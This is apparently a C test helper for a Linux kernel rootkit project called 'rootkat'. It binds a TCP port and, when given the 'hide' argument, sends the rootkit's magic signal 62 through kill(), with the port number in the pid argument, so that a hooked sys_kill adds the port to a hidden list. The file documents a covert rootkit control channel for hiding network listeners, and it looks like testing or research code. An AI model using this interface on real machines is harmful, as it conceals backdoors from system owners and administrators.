// SPDX-License-Identifier: MIT
/*
 * Helper: bind a TCP port and listen. With argv[2]="hide", also send the
 * rootkat hide-port magic signal (which uses the pid_t arg to kill() to
 * carry the port number). Without "hide", just listens — used for the
 * post-unload sanity assertion.
 *
 * Output: prints "ready" to stdout once listening (and after hide if
 * applicable), so the test can synchronize. Then pauses until killed.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define ROOTKAT_HIDE_PORT_SIG 62

int main(int argc, char **argv)
{
	if (argc < 2) {
		fprintf(stderr, "usage: %s <port> [hide]\n", argv[0]);
		return 1;
	}
	int port = atoi(argv[1]);
	int hide = (argc > 2 && strcmp(argv[2], "hide") == 0);

	int s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0) { perror("socket"); return 1; }
	int one = 1;
	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port   = htons(port),
		.sin_addr   = { .s_addr = INADDR_ANY },
	};
	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		fprintf(stderr, "bind(%d): %s\n", port, strerror(errno));
		return 1;
	}
	if (listen(s, 1) < 0) {
		fprintf(stderr, "listen: %s\n", strerror(errno));
		return 1;
	}

	if (hide) {
		/* kill(port, ROOTKAT_HIDE_PORT_SIG): the rootkat sys_kill hook
		 * reads the pid arg as the port number to add to its hidden list. */
		if (kill(port, ROOTKAT_HIDE_PORT_SIG) < 0) {
			fprintf(stderr, "kill(%d, %d): %s\n",
			        port, ROOTKAT_HIDE_PORT_SIG, strerror(errno));
			return 1;
		}
	}

	puts("ready");
	fflush(stdout);

	pause();
	return 0;
}
